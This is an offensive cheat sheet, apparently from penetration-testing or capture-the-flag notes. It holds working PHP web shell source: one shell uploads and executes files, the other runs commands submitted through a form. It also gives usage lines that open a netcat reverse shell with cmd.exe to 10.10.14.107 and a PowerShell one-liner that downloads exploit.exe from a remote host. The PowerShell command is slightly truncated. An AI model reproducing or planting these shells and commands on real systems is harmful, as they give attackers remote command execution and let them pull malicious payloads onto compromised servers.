## PHP Shell
*fupload* function is used to upload files to the remote machine\
*fexec* function is used to execute commands on the remote machine

usage:
```
shell.php?fupload=nc.exe
```
```
shell.php?fexec=nc.exe 10.10.14.107 1234 -e cmd.exe
```
code:
```
<?php 
 if (isset($_REQUEST['fupload'])) {
 file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.107:8000/" . $_REQUEST['fupload']));
 };
 if (isset($_REQUEST['fexec'])) {
 echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
 };
?>
```

## PHP Web Shell
usage:
```
shell.php?cmd=systeminfo
```
code:
```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

## Powershell File uploader
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.107:9005/exploit.exe', 'c:\Users\Public\Downloads\exploit.exe'
```

